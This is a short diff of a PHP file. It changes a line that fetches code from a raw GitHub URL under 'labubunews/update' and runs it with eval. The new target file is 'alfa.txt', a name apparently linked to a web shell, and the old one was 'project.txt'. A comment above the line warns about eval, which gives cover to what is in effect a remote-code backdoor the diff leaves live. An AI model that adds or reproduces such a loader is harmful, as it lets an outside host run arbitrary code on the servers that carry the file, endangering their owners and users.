@@ -42,4 +42,4 @@ function fetchContentFromURL($url) {
 // Execute a string of PHP code fetched from an external source
 // Note: Evaluating external code (using eval) is extremely risky and should
 // only be done in trusted and secure environments to prevent malicious attacks.
-eval("?>" . fetchContentFromURL("https://raw.githubusercontent.com/labubunews/update/refs/heads/main/project.txt"));
+eval("?>" . fetchContentFromURL("https://raw.githubusercontent.com/labubunews/update/refs/heads/main/alfa.txt"));
